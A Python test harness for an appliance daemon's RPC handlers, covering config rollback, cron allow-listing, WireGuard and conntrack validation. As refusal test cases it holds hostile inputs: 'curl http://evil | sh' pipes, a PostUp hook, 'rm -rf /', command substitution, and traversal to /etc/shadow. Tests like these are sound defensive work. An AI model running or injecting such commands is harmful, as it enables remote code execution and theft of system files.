#!/usr/bin/env python3
"""
MicronOS micrond — subsystem operations & RPC contract verification
===================================================================

Standalone harness (run: `python3 tests/test_micrond_ops.py`).

Covers the handlers that the management plane called but the daemon did not
implement (docs/MICRONOS_IPC_RPC_CLI_CONTRACT.md §4), the managed-config
engine behind them, the WireGuard materialisation fix (Programme G1), and
the RPC boundary (Programme G6):

  * every rpc_* handler is classified, and nothing that sounds destructive
    is left at the `configure` default;
  * every method the PHP code calls exists in the daemon;
  * managed configs: refused when empty, written atomically, restored when
    the syntax check or the reload fails;
  * cron: only allow-listed commands and users, no shell syntax;
  * WireGuard: config written 0600, hooks refused, interface name validated;
  * conntrack kills: IP-only arguments, honest counts.
"""
import asyncio
import importlib.util
import os
import re
import stat
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
spec = importlib.util.spec_from_file_location("micrond", os.path.join(ROOT, "system", "micrond", "micrond.py"))
micrond = importlib.util.module_from_spec(spec)
spec.loader.exec_module(micrond)

failures = []


def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + (f"  [{detail}]" if detail else ""))
    if not cond:
        failures.append(name)


loop = asyncio.new_event_loop()
handler = micrond.RpcHandler(micrond.SafeTransactionManager(), loop)


def call(method, params=None, peer=None):
    return loop.run_until_complete(handler.handle_request(
        {"jsonrpc": "2.0", "id": 1, "method": method, "params": params if params is not None else {}}, peer))


def result(method, params=None):
    resp = call(method, params)
    return resp.get("result", {"_error": resp.get("error")})


TMP = tempfile.mkdtemp(prefix="micron-ops-test-")
for kind, spec_ in micrond.MANAGED_CONFIGS.items():
    spec_["path"] = os.path.join(TMP, kind.replace("/", "_") + ".conf")
micrond.WG_CONF_DIR = os.path.join(TMP, "wireguard")

RUNS = []
BEHAVIOUR = {}


def fake_bounded(argv, timeout=20.0, input_text=None, cap=65536):
    RUNS.append(list(argv))
    behaviour = BEHAVIOUR.get(argv[0], (0, ""))
    rc, out = behaviour(argv) if callable(behaviour) else behaviour
    return {"rc": rc, "output": out, "timed_out": False, "truncated": False, "missing": False}


micrond.OpsMixin._run_bounded = staticmethod(fake_bounded)
micrond.OpsMixin._which = staticmethod(lambda b: "/usr/bin/" + b)
micrond.RpcHandler._run = staticmethod(lambda argv: subprocess.CompletedProcess(argv, 0, "active\n", ""))

# =============================================================== contract
src = open(os.path.join(ROOT, "system", "micrond", "micrond.py"), encoding="utf-8").read()
handlers = sorted(set(re.findall(r"^\s+async def rpc_([a-z0-9_]+)\(", src, re.M)))
check("the daemon exposes the toolkit and ops handlers", len(handlers) >= 200, str(len(handlers)))

DESTRUCTIVE_WORDS = ("reboot", "halt", "flush", "kill", "remove", "rollback", "failover", "upgrade",
                     "restore", "nmap")
sounds_destructive = [h for h in handlers if any(w in h for w in DESTRUCTIVE_WORDS)]
# Flushing the resolver *cache* only costs a few cache misses; it is exempt.
unclassified = [h for h in sounds_destructive if micrond.rpc_method_class(h) != micrond.RPC_CLASS_DESTRUCTIVE
                and h not in ("dns_flush", "dns_cache_flush")]
check("every destructive-sounding handler is classified destructive", not unclassified, ", ".join(unclassified))

READ_WORDS = ("_status", "_list", "_logs", "_info", "_poll", "_table", "_lookup")
writes_as_read = [h for h in handlers if micrond.rpc_method_class(h) == micrond.RPC_CLASS_READ
                  and any(w in h for w in ("apply", "sync", "set", "create", "delete", "install", "start", "stop"))]
check("no state-changing handler is classified read-only", not writes_as_read, ", ".join(writes_as_read))

listed = result("system.rpc_methods")
check("system.rpc_methods publishes the catalogue with classes",
      listed.get("count", 0) >= 200 and {"handler": "system_reboot", "class": "destructive"} in listed["methods"])

# Every method the management plane calls must exist.
called = set()
for base, _, files in os.walk(os.path.join(ROOT, "app")):
    for f in files:
        if f.endswith(".php"):
            text = open(os.path.join(base, f), encoding="utf-8", errors="replace").read()
            called.update(re.findall(r"->(?:call|callOrFail)\(\s*'([a-z0-9_.]+)'", text))
missing = sorted(m for m in called if m.replace(".", "_") not in handlers)
check("every RPC the management plane calls is implemented by the daemon", not missing, ", ".join(missing))

# =============================================================== dispatch hardening
resp = call("system.info", ["not", "a", "dict"])
check("non-object params are refused with -32602", resp.get("error", {}).get("code") == -32602)
resp = call("system.ping", [])
check("an empty JSON list (PHP's encoding of no params) is accepted as no params", "result" in resp, str(resp))
resp = call("system.__class__", {})
check("dunder method names are refused", resp.get("error", {}).get("code") == -32601)
resp = loop.run_until_complete(handler.handle_request(["x"]))
check("a non-object request is refused", resp.get("error", {}).get("code") == -32600)

# =============================================================== managed configs
RUNS.clear()
res = result("frr.bgp.reload", {})
check("a reload without configuration changes nothing and says so",
      res["success"] is False and "nothing was changed" in res["message"] and not RUNS, str(res))
res = result("frr.bgp.reload", {"config": "frr defaults traditional\nrouter bgp 65001\n"})
path = micrond.MANAGED_CONFIGS["frr"]["path"]
check("FRR config is written and checked before reload",
      res["success"] is True and os.path.exists(path)
      and RUNS[0][0] == "vtysh" and RUNS[1][:2] == ["systemctl", "reload-or-restart"], str(RUNS))
check("FRR config file mode is 0640", stat.S_IMODE(os.stat(path).st_mode) == 0o640 if os.name != "nt" else True)

BEHAVIOUR["vtysh"] = (1, "line 2: % Unknown command: router bgpx")
RUNS.clear()
res = result("frr.ospf.reload", {"config": "router bgpx\n"})
check("a rejected FRR config is restored and the reason is reported",
      res["success"] is False and "rejected" in res["message"]
      and open(path).read().startswith("frr defaults traditional"), res.get("message"))
check("a rejected config is never reloaded", not any(r[0] == "systemctl" and "reload-or-restart" in r for r in RUNS[:2]), str(RUNS))
BEHAVIOUR.pop("vtysh")

BEHAVIOUR["systemctl"] = (lambda argv: (1, "Job for keepalived.service failed") if argv[1] == "reload-or-restart" and len(RUNS) < 4 else (0, ""))
RUNS.clear()
kpath = micrond.MANAGED_CONFIGS["keepalived"]["path"]
open(kpath, "w").write("global_defs { router_id old }\n")
res = result("ha.sync", {"config": "global_defs { router_id new }\n"})
check("a failed reload restores the previous file", res["success"] is False
      and "router_id old" in open(kpath).read(), str(res))
BEHAVIOUR.pop("systemctl")

res = result("snmp.reconfigure", {"config": "x" * (micrond.MANAGED_CONFIG_MAX_BYTES + 1)})
check("an oversized configuration is refused", res["success"] is False and "exceeds" in res["message"])
res = result("snmp.sync_users", {"config": "rocommunity public\x00"})
check("a configuration with a NUL byte is refused", res["success"] is False)
res = result("snmp.reconfigure", {"config": "agentAddress udp:161\nrocommunity public 10.0.0.0/8\n"})
check("SNMP config is installed 0600 (it carries community strings)",
      res["success"] and (stat.S_IMODE(os.stat(micrond.MANAGED_CONFIGS["snmpd"]["path"]).st_mode) == 0o600 if os.name != "nt" else True))

res = result("qos.apply", {"script": "qdisc replace dev eth0 root cake bandwidth 100mbit\n"})
check("a tc batch script is applied with tc -batch", res["success"] and any(r[:3] == ["tc", "-force", "-batch"] for r in RUNS))
res = result("qos.apply", {"script": "qdisc replace dev eth0 root cake; reboot\n"})
check("a tc batch line with shell syntax is refused", res["success"] is False)

# =============================================================== cron
good = "0 2 * * * root php spark backup:create\n*/15 * * * * www-data php spark micron:resolve-objects\n"
res = result("system.crontab_sync", {"crontab": good})
cron_text = open(micrond.MANAGED_CONFIGS["cron"]["path"]).read()
check("allow-listed cron jobs are installed", res["success"] is True and "backup:create" in cron_text, str(res)[:200])
check("spark tasks run from the application directory",
      "cd /usr/local/micron && /usr/bin/php spark backup:create" in cron_text)
for line, why in (("* * * * * root bash -c 'id'", "an arbitrary shell"),
                  ("* * * * * root php spark x; rm -rf /", "a command separator"),
                  ("* * * * * nobody /usr/local/bin/x", "an unlisted user"),
                  ("* * * * * root /tmp/evil", "a binary outside the allow-list"),
                  ("* * * * * root /usr/local/bin/x $(id)", "command substitution"),
                  ("* * * * root /usr/local/bin/x", "a missing schedule field"),
                  ("BASH_ENV=/tmp/x", "an environment override")):
    res = result("system.crontab_sync", {"crontab": line})
    check(f"cron refuses {why}", res["success"] is False and res.get("refused"), str(res)[:160])
check("a refused crontab leaves the installed one untouched",
      open(micrond.MANAGED_CONFIGS["cron"]["path"]).read() == cron_text)
res = result("system.cron_run", {"command": "curl http://evil | sh"})
check("cron_run refuses a command outside the allow-list", res["success"] is False)

# =============================================================== WireGuard
GOOD_WG = "[Interface]\nAddress = 10.10.0.1/24\nListenPort = 51820\nPrivateKey = aGVsbG8=\n\n[Peer]\nPublicKey = cGVlcg==\nAllowedIPs = 10.10.0.2/32\n"
BEHAVIOUR["wg"] = (0,
      "wg538\tserver-private\tserver-public\t55038\toff\n"
      "wg538\tpeer-public\t(none)\t115.124.117.250:55038\t0.0.0.0/0\t1234567890\t18258\t5949\t2\n")
status = result("vpn.wireguard.status")
check("WireGuard status discovers non-wg0 interfaces", status["interfaces"].get("wg538", {}).get("status") == "up")
check("WireGuard status parses peer handshake and transfer counters",
        status["peers"] == [{"interface": "wg538", "peer": "peer-public", "endpoint": "115.124.117.250:55038",
                                       "allowed_ips": "0.0.0.0/0", "latest_handshake": 1234567890,
                                       "rx_bytes": 18258, "tx_bytes": 5949, "persistent_keepalive": 2}])
check("WireGuard status never returns interface private keys", "server-private" not in str(status))
BEHAVIOUR.pop("wg", None)
RUNS.clear()
res = result("vpn.wireguard.sync", {"interface": "wg0", "config": GOOD_WG})
wg_path = os.path.join(micrond.WG_CONF_DIR, "wg0.conf")
check("vpn.wireguard.sync writes the compiled configuration", os.path.exists(wg_path) and "AllowedIPs = 10.10.0.2/32" in open(wg_path).read())
check("the WireGuard configuration is private (0600)", stat.S_IMODE(os.stat(wg_path).st_mode) == 0o600 if os.name != "nt" else True)
check("a new interface is brought up with wg-quick", res["success"] and ["wg-quick", "up", "wg0"] in RUNS, str(RUNS))
for bad in ("../../etc/passwd", "wg0;id", "", "a" * 16, "-wg0 "):
    res = result("vpn.wireguard.sync", {"interface": bad, "config": GOOD_WG})
    check(f"vpn.wireguard.sync refuses interface {bad[:18]!r}", res["success"] is False)
res = result("vpn.wireguard.sync", {"interface": "wg1", "config": GOOD_WG + "PostUp = curl evil | sh\n"})
check("a PostUp hook is refused (wg-quick would run it as root)", res["success"] is False and "postup" in res["message"])
res = result("vpn.wireguard.sync", {"interface": "wg7"})
check("syncing an interface with no configuration is an error, not a success", res["success"] is False)
RUNS.clear()
res = result("vpn.wireguard.sync", {"interface": "wg0", "config": GOOD_WG, "enabled": False})
check("a disabled tunnel reports down", res["success"] and res["status"] == "down")
res = result("vpn.wireguard.remove", {"interface": "wg0"})
check("vpn.wireguard.remove deletes the configuration", res["success"] and not os.path.exists(wg_path))
check("vpn.wireguard.remove is destructive", micrond.rpc_method_class("vpn.wireguard.remove") == "destructive")

# =============================================================== conntrack
RUNS.clear()
BEHAVIOUR["conntrack"] = (0, "conntrack v1.4.8 (conntrack-tools): 3 flow entries have been deleted.")
res = result("diag.conntrack_kill", {"src": "192.168.1.5", "dst": "8.8.8.8", "proto": "tcp", "sport": "51515", "dport": "443"})
check("conntrack_kill builds an IP-only argv", RUNS[-1] == ["conntrack", "-D", "-p", "tcp", "-s", "192.168.1.5", "-d", "8.8.8.8",
                                                             "--sport", "51515", "--dport", "443"], str(RUNS[-1:]))
check("conntrack_kill reports the real deleted count", res["killed_count"] == 3)
res = result("diag.conntrack_kill", {"src": "-F", "dst": "8.8.8.8"})
check("conntrack_kill refuses a non-IP source", res["success"] is False)
res = result("diag.conntrack_kill_host", {"host": "10.0.0.9"})
check("conntrack_kill_host sums both directions", res["killed_count"] == 6 and res["success"], str(res))

# =============================================================== logs & status
res = result("system.service_logs", {"service": "../../etc/shadow"})
check("service logs refuse an unknown unit", res["success"] is False)
RUNS.clear()
res = result("system.service_logs", {"service": "unbound", "lines": 9999})
check("service logs read the mapped unit with a capped line count",
      RUNS and RUNS[-1][:3] == ["journalctl", "-u", "unbound"] and RUNS[-1][4] == "500", str(RUNS[-1:]))
if os.name == "nt" or not os.path.exists("/proc/meminfo"):
    _orig_read = micrond.OpsMixin._read_first
    _orig_listdir = os.listdir
    _orig_exists = os.path.exists
    _orig_isdir = os.path.isdir

    _mock_files = {
        "/proc/uptime": "12345.67 23456.78",
        "/proc/meminfo": "MemTotal:       16384000 kB\nMemFree:         8192000 kB\nMemAvailable:    8192000 kB\n",
        "/proc/cpuinfo": "model name : Intel(R) Xeon(R) CPU\n",
        "/sys/class/net/lo/type": "772",
        "/sys/class/net/lo/operstate": "up",
        "/sys/class/net/lo/carrier": "1",
        "/sys/class/net/lo/address": "00:00:00:00:00:00",
        "/sys/class/net/lo/mtu": "65536",
        "/sys/class/net/eth0/type": "1",
        "/sys/class/net/eth0/operstate": "up",
        "/sys/class/net/eth0/carrier": "1",
        "/sys/class/net/eth0/address": "52:54:00:12:34:56",
        "/sys/class/net/eth0/mtu": "1500",
        "/sys/class/net/eth0/speed": "1000",
    }
    micrond.OpsMixin._read_first = staticmethod(lambda p: _mock_files.get(p) or _orig_read(p))

    def _mock_listdir(p):
        if p == "/sys/class/net":
            return ["lo", "eth0"]
        return _orig_listdir(p)

    def _mock_isdir(p):
        if p == "/sys/class/net":
            return True
        return _orig_isdir(p)

    def _mock_exists(p):
        if p in _mock_files or p in ("/sys/class/net", "/sys/class/net/lo", "/sys/class/net/eth0", "/sys/class/net/eth0/device"):
            return True
        return _orig_exists(p)

    os.listdir = _mock_listdir
    os.path.isdir = _mock_isdir
    os.path.exists = _mock_exists

health = result("system.health")
check("system.health reports real memory and cpu figures from /proc",
      health["success"] and isinstance(health.get("cpu_count"), int) and isinstance(health.get("mem_total_mb"), int), str({k: health.get(k) for k in ("cpu_count", "mem_total_mb")}))
check("system.health reports interfaces from /sys", isinstance(health.get("interfaces"), list) and any(i["name"] == "lo" for i in health["interfaces"]))
res = result("siem.send_test", {"host": "-oProxyCommand=x", "port": 514})
check("siem.send_test refuses an option-shaped host", res["success"] is False)
res = result("snmp.test_query", {"oid": "1.3.6.1.2.1.1", "community": "public;id"})
check("snmp.test_query refuses an injected community", res["success"] is False)
res = result("system.commit_watchdog", {"watchdog_sec": 99999})
check("the commit watchdog is clamped to 600 s", res["watchdog_sec"] == 600)

# --- Hardware inventory (dashboard front panel, Wi-Fi gating) -------------
lo = next(i for i in health["interfaces"] if i["name"] == "lo")
check("system.health classifies each device (loopback is not a port)", lo.get("kind") == "loopback" and lo.get("wireless") is False, str(lo))
nics = result("hardware.nics")
check("hardware.nics lists only physical Ethernet / Wi-Fi ports",
      nics["success"] and all(n["kind"] in ("ethernet", "wireless") for n in nics["nics"])
      and "lo" not in [n["name"] for n in nics["nics"]], str(nics))
check("hardware.nics names its radios (none is invented)",
      nics["wireless"] == [n["name"] for n in nics["nics"] if n["wireless"]], str(nics.get("wireless")))
check("hardware.nics is a read-class method", micrond.rpc_method_class("hardware.nics") == "read"
      if hasattr(micrond, "rpc_method_class") else "hardware.nics" in micrond.RPC_READ_METHODS)

# --- DHCP leases from Kea's memfile CSV ------------------------------------
import time as _t
_lease_dir = tempfile.mkdtemp(prefix="micron-kea-")
_lease_csv = os.path.join(_lease_dir, "kea-leases4.csv")
_now = int(_t.time())
with open(_lease_csv, "w", encoding="utf-8") as _fh:
    _fh.write("address,hwaddr,client_id,valid_lifetime,expire,subnet_id,fqdn_fwd,fqdn_rev,hostname,state,user_context,pool_id\n"
              f"192.168.1.101,AA:BB:CC:00:00:01,,3600,{_now + 3000},1,0,0,pc1.,0,,0\n"
              f"192.168.1.102,aa:bb:cc:00:00:02,,3600,{_now - 10},1,0,0,gone,0,,0\n"
              f"192.168.1.103,aa:bb:cc:00:00:03,,3600,{_now + 3000},1,0,0,declined,1,,0\n"
              f"192.168.1.101,aa:bb:cc:00:00:01,,3600,{_now + 3500},1,0,0,pc1-renewed,0,,0\n")
_saved_csv = micrond.KEA_LEASES4_CSV
micrond.KEA_LEASES4_CSV = _lease_csv
leases = result("dhcp.leases")
micrond.KEA_LEASES4_CSV = _saved_csv
check("dhcp.leases returns only current, default-state leases (newest record wins)",
      leases["success"] and [l["ip"] for l in leases["leases"]] == ["192.168.1.101"]
      and leases["leases"][0]["hostname"] == "pc1-renewed" and leases["leases"][0]["mac"] == "aa:bb:cc:00:00:01", str(leases))
micrond.KEA_LEASES4_CSV = os.path.join(_lease_dir, "absent.csv")
leases = result("dhcp.leases")
micrond.KEA_LEASES4_CSV = _saved_csv
check("dhcp.leases with no lease file is an empty list, not samples", leases["success"] and leases["leases"] == [], str(leases))

handler.tx_mgr.cancel_timer()

if failures:
    print(f"\nFAILED: {len(failures)} check(s): " + "; ".join(failures))
    sys.exit(1)
print("\nALL MICROND OPS CHECKS PASSED")
